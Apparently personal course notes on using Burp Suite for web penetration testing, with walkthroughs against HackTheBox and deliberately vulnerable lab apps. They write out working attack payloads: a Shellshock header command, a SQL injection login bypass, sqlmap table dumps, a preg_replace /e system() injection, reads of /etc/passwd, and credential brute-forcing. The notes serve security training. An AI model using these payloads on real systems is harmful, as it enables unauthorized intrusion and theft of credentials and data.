&nbsp;		○ Configuring External Browsers (Example: Firefox in Kali)

&nbsp;			§ Steps to configure Firefox:

&nbsp;				□ Open Preferences → Network Settings.

&nbsp;				□ Change from No Proxy to Manual Proxy.

&nbsp;				□ Set proxy server to 127.0.0.1 (localhost).

&nbsp;				□ Set port to 8080.

&nbsp;				□ Apply same settings for HTTP, HTTPS, and FTP traffic.

&nbsp;		○ Proxying Mobile Traffic (Example: Android)

&nbsp;			§ Steps to configure Android network:

&nbsp;				□ Long press on the network name → Modify network.

&nbsp;				□ Check Show advanced options.

&nbsp;				□ Select Proxy → Manual.

&nbsp;				□ Set proxy address to the Burp Suite host machine’s IP.

&nbsp;				□ Set port to 8080.

&nbsp;			§ This allows intercepting mobile app/web traffic through Burp Suite.



Using Burp Suite as a Proxy

&nbsp;	• Burp Suite’s proxy function enables testers to intercept, analyze, and manage web traffic. The Community Edition allows passive traffic capture and scoping, while the Professional Edition adds automation like spidering/crawling and vulnerability scanning.

&nbsp;	• Key Concepts

&nbsp;		○ Using Burp’s Proxy and Browser

&nbsp;			§ Start with Proxy → Intercept (turn off intercept to let traffic flow).

&nbsp;			§ Burp launches its own Chromium-based browser.

&nbsp;			§ Navigating to a target (e.g., Metasploitable) sends all traffic through Burp, which records it in the Target → Site Map.

&nbsp;		○ Community Edition Capabilities

&nbsp;			§ Records only what you visit manually (no automated crawling/spidering).

&nbsp;			§ Message Exchanges Panel: Shows requests/responses for each page visited.

&nbsp;			§ Target Scope Control:

&nbsp;				□ Define what’s in-scope via Scope Settings or right-clicking specific targets.

&nbsp;				□ Out-of-scope traffic can be excluded to reduce clutter.

&nbsp;			§ Discovery Example: Found a hidden database password in an HTML comment — showing how even simple inspection can reveal vulnerabilities.

&nbsp;		○ Scope Management

&nbsp;			§ Add/remove specific URLs or directories to scope.

&nbsp;			§ Burp can filter out-of-scope traffic and focus on target systems.

&nbsp;			§ Example: Added Mutillidae and DVWA to scope to ensure their traffic is captured.

&nbsp;		○ Community vs. Professional Edition

&nbsp;			§ Community Edition:

&nbsp;				□ Passive recording only.

&nbsp;				□ No automated spidering or active vulnerability scanning.

&nbsp;			§ Professional Edition:

&nbsp;				□ Adds Passive Scanning: Crawls site to discover pages.

&nbsp;				□ Adds Active Scanning: Actively tests discovered pages for vulnerabilities.

&nbsp;				□ Results appear in the Issues Pane as vulnerabilities are detected.



Setting Up Additional Targets

&nbsp;	• To practice penetration testing with Burp Suite, it’s helpful to have multiple vulnerable web applications set up as targets. The transcript demonstrates setting up OWASP’s Broken Web Application (BWA) and Xtreme Vulnerable Web Application (XVWA) for training and hands-on practice.

&nbsp;	• Key Concepts

&nbsp;		○ OWASP Broken Web Application (BWA) VM

&nbsp;			• Downloadable virtual machine appliance.

&nbsp;			• Contains multiple deliberately vulnerable apps for training, including:

&nbsp;				□ WebGoat (Java-based security lessons).

&nbsp;				□ RailsGoat (Ruby on Rails vulnerabilities).

&nbsp;				□ Damn Vulnerable Web Application (DVWA).

&nbsp;				□ Security Shepherd (gamified web security trainer).

&nbsp;				□ Mutillidae II (updated version of Mutillidae).

&nbsp;				□ Real-world examples like OrangeHRM (older HR management app).

&nbsp;			• Provides a consolidated environment for security training.

&nbsp;		○ Xtreme Vulnerable Web Application (XVWA)

&nbsp;			• A PHP/SQL-based vulnerable app designed for practice.

&nbsp;			• Can be hosted on a Kali Linux system.

&nbsp;			• Setup steps:

&nbsp;				□ Start Apache and MySQL services:

&nbsp;					sudo service apache2 start  

&nbsp;					sudo service mysql start

&nbsp;				□ Clone repository into web root:

&nbsp;					cd /var/www/html  

&nbsp;					sudo git clone https://github.com/s4n7h0/xvwa.git

&nbsp;				□ Create and configure database:

&nbsp;					sudo mysql -u root -e "create database xvwa;"  

&nbsp;					sudo mysql -u root -e "grant all privileges on \*.\* to xman@localhost identified by 'xman';"

&nbsp;				□ Update config.php with the new username/password (xman/xman).

&nbsp;				□ Complete setup by visiting the XVWA site in a browser.

&nbsp;		○ Why Multiple Targets Help

&nbsp;			• Different apps expose testers to different languages, frameworks, and vulnerabilities.

&nbsp;			• Expands hands-on skills with Burp Suite.

&nbsp;			• Encourages real-world practice beyond a single testbed (e.g., Metasploitable).



#### Scanning



Crawling the Website

&nbsp;	• Burp Suite Professional Edition enables automated crawling and auditing of a website. The crawler systematically explores the site, while the auditor tests for vulnerabilities, highlighting issues with severity levels. Authentication can also be configured to extend testing into protected areas.

&nbsp;	• Key Concepts

&nbsp;		○ Crawling in Burp Suite Professional

&nbsp;			• Crawling = Automated exploration of a website’s structure and links.

&nbsp;			• Initiated by right-clicking a target in the Site Map and opening the scan panel.

&nbsp;			• Parameters include the target URL, HTTP/HTTPS options, etc.

&nbsp;			• Crawl results populate the website tree in the Site Map.

&nbsp;		○ Auditing (Vulnerability Testing)

&nbsp;			• After crawling, Burp Suite automatically starts auditing discovered pages.

&nbsp;			• Issues appear in the Issues Pane (top-right), categorized by severity.

&nbsp;			• Red dots in the Site Map indicate high-severity vulnerabilities.

&nbsp;			• Each issue includes:

&nbsp;				□ Advisory details.

&nbsp;				□ Request and response messages that triggered detection.

&nbsp;		○ Example Findings

&nbsp;			• File Path Manipulation in Mutillidae.

&nbsp;			• OS Command Injection vulnerabilities.

&nbsp;			• Each vulnerability can be inspected alongside the associated web page and traffic.

&nbsp;		○ Authenticated Scans

&nbsp;			• Burp Suite supports scanning behind login forms.

&nbsp;			• Testers can configure application credentials:

&nbsp;				□ Example: DVWA → username: admin, password: password.

&nbsp;			• Burp will automatically use these credentials to log in during crawling, enabling deeper testing of protected content.



Finding Hidden Webpages

&nbsp;	• Web servers often have hidden or unlinked pages (e.g., admin consoles, configuration files, secondary apps). Burp Suite provides built-in tools to perform content discovery, similar to external tools like DirBuster or Gobuster, to uncover these hidden endpoints.

&nbsp;	• Key Concepts

&nbsp;		○ Why Hidden Pages Matter

&nbsp;			§ Many web applications expose unlinked resources:

&nbsp;				□ Admin portals (/admin).

&nbsp;				□ Configuration files (e.g., phpinfo.php, phpmyadmin).

&nbsp;				□ Application subdirectories.

&nbsp;			§ These may contain sensitive functionality or credentials.

&nbsp;			§ They are not discoverable through normal navigation since they aren’t linked.

&nbsp;		○ Discovery Tools

&nbsp;			§ External tools: dirb, Gobuster, DirBuster.

&nbsp;			§ Burp Suite’s built-in content discovery offers similar functionality.

&nbsp;		○ Burp Suite Discovery Workflow

&nbsp;			§ Set Scope: Add target (e.g., 10.10.10.191) to ensure focused results.

&nbsp;			§ Crawl: Initial automated crawl finds linked pages.

&nbsp;			§ Engagement Tools → Discover Content:

&nbsp;				□ Configure parameters:

&nbsp;					® Set crawl depth (e.g., depth 2).

&nbsp;					® Choose wordlists (e.g., DirBuster medium).

&nbsp;					® Exclude unnecessary file extensions.

&nbsp;				□ Run discovery session.



Understanding Message Content

&nbsp;	• To effectively use Burp Suite for penetration testing, testers must understand how messages (requests and responses) are displayed, analyzed, and manipulated. Burp Suite provides multiple views, search tools, and inspectors to uncover details that may not be visible in the browser, such as hidden fields or injected parameters.

&nbsp;	• Key Concepts

&nbsp;		○ Message Panels in Burp Suite

&nbsp;			§ Contents Panel:

&nbsp;				□ Shows overall message exchanges with timestamp, status, length, content type, and webpage title.

&nbsp;			§ Request \& Response Panels:

&nbsp;				□ Can be viewed raw, in “pretty” formatted mode, or “rendered” as processed HTML.

&nbsp;				□ Configurable layout: side-by-side, vertical, or tabbed.

&nbsp;			§ Inspector: Extracts key details like request attributes, request/response headers.

&nbsp;		○ Search and Analysis Features

&nbsp;			§ Search boxes allow keyword matching in request/response panels.

&nbsp;			§ Supports case-sensitive and regex searches.

&nbsp;			§ Context menus and dropdowns provide shortcuts for analyzing and acting on data.

&nbsp;		○ Understanding HTTP Data Encoding

&nbsp;			§ Input fields in forms are sent as key=value pairs concatenated with “\&”.

&nbsp;			§ Example: payee=SPRINT\&amount=75.

&nbsp;			§ Shows how what’s visible in the browser may differ from what’s actually sent in the request.

&nbsp;		○ Detecting Hidden or Unexpected Data

&nbsp;			§ Example: Anonymous feedback form added a user ID (3487) automatically, even though the user didn’t provide it.

&nbsp;			§ Burp’s Response Modification Option (“unhide hidden form fields”) reveals hidden fields in web forms.

&nbsp;			§ Hidden fields may be used for tracking, fingerprinting, or security tokens.

&nbsp;		○ Headers and Security Testing

&nbsp;			§ Important details may appear in message headers:

&nbsp;				□ Session IDs.

&nbsp;				□ Authorization tokens.

&nbsp;				□ Other credentials.

&nbsp;			§ Headers are potential targets for specific attacks, e.g.:

&nbsp;				□ Web cache poisoning.

&nbsp;				□ Virtual host brute forcing.



Finding Missing Content

&nbsp;	• When analyzing web traffic in Burp Suite, important messages (like failed logins or authorization headers) may not always appear in the main panels. Testers must know how to adjust view settings, use interception, and check HTTP history to ensure no crucial content is missed during penetration testing.

&nbsp;	• Key Concept

&nbsp;		○ Login Testing Scenario (HackTheBox “Jerry”)

&nbsp;			§ Target: Tomcat server on port 8080.

&nbsp;			§ Attempted login (tomcat:tomcat) produces a 401 Unauthorized response.

&nbsp;			§ Credentials are sent but not immediately visible in the main Site Map view.

&nbsp;		○ Why Content Can Be Missing

&nbsp;			§ Burp Suite may filter out certain responses (e.g., 4xx errors).

&nbsp;			§ By default, these aren’t shown in the messages panel.

&nbsp;			§ Users must adjust the view filter settings (e.g., click “Show all”).

&nbsp;		○ Capturing Authorization Headers

&nbsp;			§ With Proxy → Intercept on, login requests show full HTTP messages.

&nbsp;			§ Example: Request to /manager/html includes an Authorization header (Base64-encoded credentials).

&nbsp;			§ Decoding reveals credentials (e.g., tomcat:tomcat, bobcat:bobcat, kitty:kitty).

&nbsp;		○ Differences Between Browsers

&nbsp;			§ Using Burp’s embedded browser vs. external browsers (like Kali Firefox) can affect what appears in the Site Map.

&nbsp;			§ Some messages are overwritten in the Content panel (only the last attempt may be displayed).

&nbsp;		○ Using HTTP History

&nbsp;			§ To recover all prior requests/responses, use Proxy → HTTP History.

&nbsp;			§ Provides the full sequence of messages, including:

&nbsp;				□ Attempts without authorization headers.

&nbsp;				□ Attempts with Base64-encoded credentials.

&nbsp;			§ Ensures no traffic is lost even if panels overwrite earlier data.

&nbsp;		○ Fundamental Lesson

&nbsp;			§ Don’t rely solely on one panel in Burp Suite.

&nbsp;			§ If traffic looks incomplete or missing:

&nbsp;				□ Check filter settings.

&nbsp;				□ Use intercept mode.

&nbsp;				□ Inspect HTTP history for the full picture.

#### Man in the Middle



Interpreting Bank Transactions

&nbsp;	• Burp Suite can be used to intercept and manipulate live web transactions, demonstrating how attackers could modify sensitive actions (like bank transfers) during transmission. This highlights the risk of man-in-the-middle (MITM) attacks when data isn’t protected by strong security controls (e.g., HTTPS).

&nbsp;	• Key Concepts

&nbsp;		○ Burp Suite Interception in Action

&nbsp;			§ User logs into a demo online banking site with credentials (username/password).

&nbsp;			§ Performs a fund transfer of $10 from savings to brokerage.

&nbsp;			§ With Intercept ON in Burp Suite:

&nbsp;				□ The request is captured showing transaction details (amount, source, destination, comment).

&nbsp;				□ Tester changes the transfer amount from $10 to $99.

&nbsp;				□ Burp forwards the modified request.

&nbsp;				□ Result: The bank confirms a $99 transfer, proving successful message tampering.

&nbsp;		○ Vulnerability Demonstrated

&nbsp;			§ Unencrypted or weakly protected traffic can be intercepted and modified.

&nbsp;			§ Attacker could alter:

&nbsp;				□ Transaction amount.

&nbsp;				□ Destination account.

&nbsp;				□ Other form parameters (e.g., comments, metadata).

&nbsp;		○ Security Risk Highlighted

&nbsp;			§ Using online banking over public Wi-Fi without proper protections exposes users to MITM attacks.

&nbsp;			§ Attackers could impersonate the server, intercept traffic, and modify financial transactions.

&nbsp;		○ Underlying Lesson

&nbsp;			§ Burp Suite interception illustrates the importance of:

&nbsp;				□ Transport security (TLS/HTTPS) to prevent message tampering.

&nbsp;				□ Server-side validation to ensure integrity of transactions.

&nbsp;				□ Defense in depth (e.g., cryptographic checks, multifactor confirmation).



Exploiting Headers

&nbsp;	• Burp Suite can be used to exploit vulnerabilities in HTTP headers, such as the Shellshock vulnerability in Bash CGI scripts, to achieve remote code execution on a target system.

&nbsp;	• Key Concepts

&nbsp;		○ Initial Reconnaissance

&nbsp;			§ Target: HackTheBox system Shocker (10.10.10.56).

&nbsp;			§ Initial site crawl and scan revealed little content.

&nbsp;			§ Used Burp’s Engagement Tools → Discover Content:

&nbsp;				□ Found /cgi-bin/ directory.

&nbsp;				□ Discovered user.sh script inside.

&nbsp;		○ Testing the CGI Script

&nbsp;			§ Visiting /cgi-bin/user.sh returned a basic uptime response.

&nbsp;			§ Indicated the script is executable server-side (a common CGI trait).

&nbsp;		○ Exploiting with Shellshock

&nbsp;			§ Vulnerability: Bash’s Shellshock bug (CVE-2014-6271).

&nbsp;			§ Attack method: Inject payload via custom HTTP headers.

&nbsp;			§ Process in Burp:

&nbsp;				□ Right-click request → Send to Repeater.

&nbsp;				□ Modify the User-Agent header with a Shellshock payload:

&nbsp;					® () { :; }; echo; /bin/bash -c "whoami"

&nbsp;				□ Response: Returned shelly → command execution confirmed.

&nbsp;		○ Escalating the Exploit

&nbsp;			§ Replacing whoami with other commands:

&nbsp;				□ cat /etc/passwd → dumped password file.

&nbsp;				□ ls /home/shelly → listed Shelly’s home directory.

&nbsp;				□ cat user.txt → retrieved user flag (proof of compromise).

&nbsp;		○ Core Lesson

&nbsp;			§ Message headers are not just metadata; they can be attack vectors.

&nbsp;			§ Burp Suite’s Repeater tool makes it easy to manipulate headers and test payloads.

&nbsp;			§ The Shellshock case demonstrates how a single vulnerable script can lead to full system compromise.



Inserting an SQL Injection via Burp Suite

&nbsp;	Burp Suite can work alongside SQLmap to identify and exploit SQL injection vulnerabilities in web applications. Using captured requests from Burp, testers can craft injections (like union queries) to bypass authentication and gain unauthorized access to backend databases and admin portals.

&nbsp;	• Key Concepts

&nbsp;		○ Target Setup

&nbsp;			§ Target: Europa Corp Admin Portal (admin-portal.europacorp.htb).

&nbsp;			§ Configured in /etc/hosts and set within Burp’s target scope.

&nbsp;			§ Login form requires email + password.

&nbsp;		○ Capturing Login Requests

&nbsp;			§ Used Burp Suite to capture a POST request with test credentials (test@test.nz / password).

&nbsp;			§ The captured request contains the parameters needed for injection testing.

&nbsp;		○ Using SQLmap with Burp Data

&nbsp;			§ Extracted the POST data from Burp’s captured message.

&nbsp;			§ Ran SQLmap with:

&nbsp;				sqlmap -u https://admin-portal.europacorp.htb/login.php --data="email=test@test.nz\&password=password" --dbms=mysql

&nbsp;			§ SQLmap confirmed three SQL injection vectors.

&nbsp;			§ Enumeration revealed:

&nbsp;				□ Databases: information\_schema, admin.

&nbsp;				□ Inside admin: a user's table containing usernames and password hashes.

&nbsp;		○ Manual Exploitation with Burp Repeater

&nbsp;			§ Knowledge from SQLmap showed the login query had five columns.

&nbsp;			§ Used Burp’s Repeater to inject a UNION-based SQL injection:

&nbsp;				email=test@test.nz' OR 1=1 LIMIT 1 --  

&nbsp;			§ Modified request successfully bypassed authentication.

&nbsp;			§ Redirection confirmed access to the admin portal.

&nbsp;		○ Key Lessons

&nbsp;			§ Burp Suite helps capture and manipulate raw HTTP requests.

&nbsp;			§ SQLmap automates vulnerability detection and database enumeration.

&nbsp;			§ Together, they provide a workflow for finding and exploiting SQL injection:

&nbsp;				□ Capture request in Burp.

&nbsp;				□ Feed into SQLmap for automated testing.

&nbsp;				□ Return to Burp to craft custom injections.

&nbsp;				□ Achieve authentication bypass or extract sensitive data.

&nbsp;				



Saving Request Messages for Further Exploitation

&nbsp;	• Burp Suite allows testers to save complete HTTP request messages for later use. These saved requests can be fed directly into SQLmap for automated SQL injection testing and database exploitation, providing an efficient workflow for vulnerability analysis.

&nbsp;	• Key Concepts

&nbsp;		○ Target System

&nbsp;			§ Hack The Box server Falafel (10.10.10.73).

&nbsp;			§ Website presents a login page.

&nbsp;			§ Observed behavior:

&nbsp;				□ Valid username, wrong password → “wrong identification” response.

&nbsp;				□ Invalid username → “try again” response.

&nbsp;			§ This distinction suggests a potential SQL injection vulnerability.

&nbsp;		○ Saving Request Messages in Burp Suite

&nbsp;			§ Captured the POST login request from Burp’s Site Map.

&nbsp;			§ Used Actions → Copy to File to save it as falafel.txt.

&nbsp;			§ This file contains the raw HTTP request, which SQLmap can process directly.

&nbsp;		○ Using SQLmap with Saved Requests

&nbsp;			§ SQLmap command:

&nbsp;				sqlmap -r falafel.txt --string "wrong identification"

&nbsp;				□ -r falafel.text = run SQLmap using the saved HTTP request.

&nbsp;				□ --string "wrong identification" = tells SQLmap what valid response to expect.

&nbsp;			§ SQLmap identified the injection vulnerability.

&nbsp;		○ Database Enumeration and Exploitation

&nbsp;			§ With injection confirmed, further SQLmap commands were run:

&nbsp;				□ --dbs → listed databases: falafel, information\_schema.

&nbsp;				□ -D falafel --tables → listed tables in the Falafel DB.

&nbsp;				□ -D falafel -T users --dump → dumped the users table.

&nbsp;			§ Results: Extracted usernames (admin, Chris) and password hashes.

&nbsp;			§ Next logical step (not shown): password cracking.

&nbsp;		○ Key Lessons

&nbsp;			§ Saving Burp request messages is a powerful way to bridge manual and automated testing.

&nbsp;			§ SQLmap can use full HTTP requests instead of just parameters, enabling:

&nbsp;				□ More reliable testing.

&nbsp;				□ Easier handling of complex requests.

&nbsp;			§ Recognizing different server responses helps identify injection points.



Injecting Commands into Messages

&nbsp;	• Burp Suite can be used to intercept and modify HTTP messages in order to exploit application vulnerabilities. In this case, a flaw in PHP’s preg\_replace function (with the /e modifier) allows remote command execution by injecting system commands into intercepted requests.

&nbsp;	• Key Concepts

&nbsp;		○ Target and Setup

&nbsp;			§ Target: Europa admin console → Tools page.

&nbsp;			§ Functionality: Generates a VPN script using a user-supplied IP address.

&nbsp;			§ The IP input is processed by a PHP preg\_replace function, which is vulnerable when used with the /e modifier.

&nbsp;		○ Understanding the Vulnerability

&nbsp;			§ The /e flag in preg\_replace interprets replacement strings as PHP code, enabling arbitrary command execution.

&nbsp;			§ By manipulating the request, attackers can substitute the IP field with PHP system commands.

&nbsp;		○ Exploitation Steps with Burp Suite

&nbsp;			§ Enter a placeholder IP (e.g., 10.10.10.99) and generate the script.

&nbsp;			§ Enable Burp Proxy → Intercept ON to capture the POST request to tools.php.

&nbsp;			§ Modify the payload:

&nbsp;				pattern=something%2Fe

&nbsp;				ip\_address=system('ls -al /')

&nbsp;				text=something

&nbsp;				□ %2F used for forward slashes (URL encoding).

&nbsp;				□ Command embedded into the IP field.

&nbsp;			§ Adjust Content-Length to match the new payload.

&nbsp;			§ Forward the request.

&nbsp;		○ Results of Injection

&nbsp;			§ First payload (ls -al /) → root directory listing returned.

&nbsp;			§ Second payload (ls -al /home) → revealed user directory (john).

&nbsp;			§ Third payload (cat /home/john/user.txt) → successfully dumped the user token.

&nbsp;		○ Key Lessons

&nbsp;			§ Message interception and modification is a powerful penetration testing technique.

&nbsp;			§ Vulnerabilities in backend functions (e.g., preg\_replace /e) can be leveraged for remote command execution.

&nbsp;			§ Burp Suite provides the control needed to adjust payloads (intercept, edit, recalc content length) for successful exploitation.



#### Being an Intruder



Introducing the Intruder

&nbsp;	• Burp Suite’s Intruder tool automates customized attacks on web applications, such as brute-force login attempts. It allows testers to select input fields as payload positions, supply wordlists, apply transformations, and analyze responses to discover valid credentials or exploit vulnerabilities.

&nbsp;	• Key Concepts

&nbsp;		○ Setting Up the Intruder Attack

&nbsp;			§ Target: DAB server (HackTheBox) at 10.10.10.86 on port 80.

&nbsp;			§ Initial attempt: Manual login with admin/admin failed.

&nbsp;			§ Process:

&nbsp;				□ Capture login POST request.

&nbsp;				□ Send to Intruder via Burp actions.

&nbsp;				□ Select Positions tab → mark input fields (e.g., password) with section markers.

&nbsp;		○ Configuring Payloads

&nbsp;			§ Payloads Tab:

&nbsp;				□ Load wordlists (e.g., /usr/share/wordlists/metasploit/unix\_passwords.txt).

&nbsp;				□ Options for payload processing: add prefixes, suffixes, modify case, etc.

&nbsp;			§ Encoding Options: Can transform payloads if required (e.g., Base64).

&nbsp;		○ Running the Attack

&nbsp;			§ Options Tab: Controls attack behavior (redirect handling, result processing, etc.).

&nbsp;			§ Attack Results:

&nbsp;				□ Initial run → all responses were 709 bytes (indicating failed logins).

&nbsp;				□ Second run with payload processing (modify case → capitalize first letter).

&nbsp;				□ Entry 28 (Password1) produced a different response size (512 bytes).

&nbsp;			§ Analyzing Results

&nbsp;				□ A response with different length/status often signals success.

&nbsp;				□ Verification showed admin:Password1 successfully logged in.

&nbsp;				□ Intruder flagged this by showing the different response content and size.

&nbsp;			§ Lessons Learned

&nbsp;				□ Intruder is powerful for brute-force and fuzzing attacks.

&nbsp;				□ Wordlists + payload processing increase effectiveness (e.g., case variations).

&nbsp;				□ Response analysis (length, redirects, status codes) is critical to spotting successful payloads.

&nbsp;				□ Attack options like redirection handling affect results visibility.



Manipulating Cookies

&nbsp;	• Burp Suite’s Intruder can be used to manipulate and brute-force cookie values in HTTP requests. By modifying cookies in intercepted messages and automating payload injection, testers can uncover hidden authentication mechanisms and gain access to restricted areas.

&nbsp;	• Key Concepts

&nbsp;		○ Enabling Cookies in Burp’s Browser

&nbsp;			§ Cookies are disabled by default in Burp’s browser.

&nbsp;			§ Must enable them via: Settings → Privacy \& Security → Cookies → Allow all cookies.

&nbsp;		○ Target Setup

&nbsp;			§ Logged into the DAP server (10.10.10.86) with admin:Password1.

&nbsp;			§ Main site showed nothing interesting, but another service on port 8080 displayed:

&nbsp;				□ “Access denied: password authentication cookie not set.”

&nbsp;			§ Observed request contained a session ID cookie, but no password field.

&nbsp;		○ Injecting a Cookie Value

&nbsp;			§ Hypothesis: A password field must exist in the cookie.

&nbsp;			§ Used Proxy → Intercept ON to capture request.

&nbsp;			§ Added:

&nbsp;				Cookie: sessionid=xyz; password=password1

&nbsp;			§ Server responded: “password authentication cookie incorrect” → confirmed cookie injection works but wrong password.

&nbsp;		○ Brute Forcing with Intruder

&nbsp;			§ Sent the modified request to Intruder.

&nbsp;			§ Cleared existing section markers, set the password cookie value as the payload position.

&nbsp;			§ Loaded wordlist (unix\_passwords.txt) as payload source.

&nbsp;			§ Ran attack:

&nbsp;				□ Most responses = 491 bytes (failed logins).

&nbsp;				□ Entry 41 (password=secret) = 707 bytes (different response).

&nbsp;				□ Rendering response confirmed successful access to a TCP ticket test page.

&nbsp;		○ Lessons Learned

&nbsp;			§ Cookies can contain hidden authentication fields, not just session IDs.

&nbsp;			§ Burp Intruder is effective for automating brute force attacks on cookie values.

&nbsp;			§ Response size and content differences are critical in detecting successful payloads.

&nbsp;			§ Insecure design (storing passwords in cookies) creates significant risk.



The Four Intruders

&nbsp;	• Burp Suite’s Intruder module supports four different attack types—Sniper, Battering Ram, Pitchfork, and Cluster Bomb—each suited to different testing scenarios. Combined with multiple payload types (lists, runtime files, brute force generators), Intruder provides a highly flexible and powerful tool for automated attacks against web applications.

&nbsp;	• Key Concepts

&nbsp;		○ Intruder Attack Types

&nbsp;			§ Sniper (default)

&nbsp;				□ Uses a single payload set.

&nbsp;				□ Best for testing one field at a time.

&nbsp;				□ If applied to multiple fields, it cycles through each field while keeping others fixed.

&nbsp;				□ # of requests = (payload entries × # of fields tested).

&nbsp;			§ Battering Ram

&nbsp;				□ Also uses a single payload set.

&nbsp;				□ Applies the same payload value to multiple fields at once.

&nbsp;				□ Useful when same input required across fields (e.g., username = password).

&nbsp;				□ # of requests = payload entries.

&nbsp;			§ Pitchfork

&nbsp;				□ Uses multiple payload sets (one per field).

&nbsp;				□ Uses the nth entry from each list simultaneously across fields.

&nbsp;				□ Example: 5th request = 5th value from each payload set.

&nbsp;				□ # of requests = size of the smallest payload list.

&nbsp;			§ Cluster Bomb

&nbsp;				□ Uses multiple payload sets.

&nbsp;				□ Tries every combination across all fields.

&nbsp;				□ Very powerful but grows exponentially.

&nbsp;				□ # of requests = product of payload set sizes.

&nbsp;		○ Payload Types

&nbsp;			§ Simple List: Manually or from a file.

&nbsp;			§ Runtime File: Dynamically loaded during attack.

&nbsp;			§ Brute Forcer: Generates values on the fly.

&nbsp;				□ Tester specifies character set and min/max length.

&nbsp;				□ Example: Between 4–6 chars → >1.5 million combinations.

&nbsp;				□ Extremely time-consuming for longer lengths.

&nbsp;		○ Practical Notes

&nbsp;			§ Intruder results depend heavily on:

&nbsp;				□ Correctly identifying input fields.

&nbsp;				□ Smart payload list selection.

&nbsp;				□ Attack type matching the test case.

&nbsp;			§ Example use cases:

&nbsp;				□ Sniper: SQL injection fuzzing on one parameter.

&nbsp;				□ Battering Ram: Username = Password brute force.

&nbsp;				□ Pitchfork: Coordinated parameter testing.

&nbsp;				□ Cluster Bomb: Exhaustive parameter combination testing.



#### Extensions



Using C02 to integrate SQLMap

&nbsp;	Burp Suite can be extended with BApp Store extensions. The CO2 extension integrates SQLmap directly into Burp Suite, allowing testers to quickly launch SQL injection testing from captured requests without manually copying data into the terminal.

&nbsp;	• Key Concepts

&nbsp;		○ Installing Extensions in Burp Suite

&nbsp;			§ Navigate to Extender → BApp Store.

&nbsp;			§ Many extensions are available to extend Burp’s functionality.

&nbsp;			§ CO2 is a commonly used extension for SQLmap integration.

&nbsp;		○ Setting Up CO2

&nbsp;			§ After installation, CO2 appears as a new tab in the menu bar.

&nbsp;			§ Configuration requires the path to SQLmap, e.g.:

&nbsp;				/usr/share/sqlmap/sqlmap.py

&nbsp;			§ On Linux, xterm must also be installed to run SQLmap through Burp:

&nbsp;				sudo apt install xterm

&nbsp;		○ Using CO2 with Burp Suite

&nbsp;			§ Example target: HackTheBox Falafel (10.10.10.73).

&nbsp;			§ Capture a POST login request.

&nbsp;			§ Right-click the request → Extensions → CO2 → Send to SQLmapper.

&nbsp;			§ CO2 automatically sets up a SQLmap command string for the selected request.

&nbsp;		○ Running the SQLmap Attack

&nbsp;			§ SQLmap can run directly from Burp (launches in xterm).

&nbsp;			§ Alternatively, testers can copy the generated SQLmap string and run it manually in a terminal.

&nbsp;			§ Result: SQL injection vulnerabilities are detected, same as when running SQLmap independently.

&nbsp;		○ Key Benefits

&nbsp;			§ Saves time by integrating SQLmap workflow inside Burp Suite.

&nbsp;			§ Provides a seamless bridge between manual request capture and automated SQL injection testing.

&nbsp;			§ Flexible: Run SQLmap inside Burp or extract the command for external use.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### Dynamic Application Security Testing

#### Security Testing in QA



Software Quality Assurance Process

&nbsp;	• The central theme is that security should be treated as a function of quality within the Software Development Life Cycle (SDLC). By embedding security testing into quality assurance (QA) practices, security flaws can be addressed as code defects (bugs), ensuring applications are both functional and secure.

&nbsp;	• Key Concepts

&nbsp;		○ SDLC (Software Development Life Cycle)

&nbsp;			§ A structured process for taking software from an idea to a deployed solution.

&nbsp;			§ Phases include requirements gathering, design, coding, testing, deployment, and maintenance.

&nbsp;			§ It is cyclical: new requirements or changes feed back into earlier phases.

&nbsp;		○ Integrating Security into QA

&nbsp;			§ Security should not be an afterthought or add-on.

&nbsp;			§ Instead, it should be embedded into QA processes as a measure of software quality.

&nbsp;			§ Security defects should be treated like any other bug in the backlog.

&nbsp;		○ Software Quality Assurance (QA)

&nbsp;			§ QA ensures applications meet defined quality standards before release. Activities include:

&nbsp;				□ Technical reviews to identify flaws.

&nbsp;				□ Documenting and testing strategies for repeatability and reliability.

&nbsp;				□ Defining and enforcing standards for developers and testers.

&nbsp;				□ Change control procedures to maintain system integrity.

&nbsp;				□ Metrics and measurements to validate quality standards.

&nbsp;		○ Traditional vs. Modern View of Security

&nbsp;			§ Historically: Security was often reduced to login/password checks and considered separately from quality.

&nbsp;			§ Modern perspective: Due to advanced cyber threats, robust security must be built in as part of quality, just like usability, reliability, or efficiency.

&nbsp;		○ Quality Dimensions Developers Recognize

&nbsp;			§ Developers typically focus on: portability, reliability, testability, flexibility, efficiency, and usability.

&nbsp;			§ Security should be added to this list and considered an equal aspect of quality.

&nbsp;		○ Cultural and Team Perspective

&nbsp;			§ Developers may not naturally see security as part of quality, but that provides an opportunity to educate and align teams.

&nbsp;			§ The shared goal is to ensure apps work as intended while minimizing risk from attackers.



Positive Testing

&nbsp;	• Positive testing verifies that an application behaves as expected when given valid inputs. From a security standpoint, positive testing ensures that core security controls—such as authentication, authorization, password management, and session management—function correctly. Automating these tests strengthens application security and reliability.

&nbsp;	• Key Concepts

&nbsp;		○ Definition of Positive Testing

&nbsp;			§ Focuses on providing valid input and checking whether the actual output matches the expected output.

&nbsp;			§ Example: Entering a valid U.S. ZIP code (e.g., 87104) should correctly populate the corresponding city and state.

&nbsp;		○ Functional Positive Testing

&nbsp;			§ Ensures that critical application features work as intended.

&nbsp;			§ Example: An e-commerce app must successfully allow purchases; if not, it’s not ready for production.

&nbsp;			§ Functional positive tests come from requirements documents and help confirm baseline app usability.

&nbsp;		○ Positive Security Testing

&nbsp;			§ Unlike functional tests, security-related positive tests must be deliberately designed by the QA/security team. These focus on validating that security controls work as intended:

&nbsp;				□ Access control: Does the app require a login? Can users only access their own profile/data?

&nbsp;				□ Authorization: Can users only access pages, forms, and data appropriate to their role?

&nbsp;				□ Password management:

&nbsp;					® Front-end: Can users set and reset passwords properly?

&nbsp;					® Back-end: Are passwords stored securely as salted hashes?

&nbsp;				□ Session management: Are sessions established and destroyed correctly? Is traffic always encrypted in transit?

&nbsp;		○ Guidance \& Resources

&nbsp;			§ OWASP Web Security Testing Guide can provide detailed procedures and ideas for designing these security test cases.

&nbsp;		○ Automation

&nbsp;			§ Once positive security test cases are built, they can be automated.

&nbsp;			§ Automation ensures that with every new release/version, security controls are consistently validated.

&nbsp;			§ This creates a reliable baseline of core security requirements.



Negative Testing

&nbsp;	• Negative testing is about deliberately providing unexpected or malicious input to an application to see if it behaves incorrectly, leaks data, or becomes vulnerable to attack. It complements positive testing by preparing applications to resist real-world threats, making it an essential part of security-focused QA.

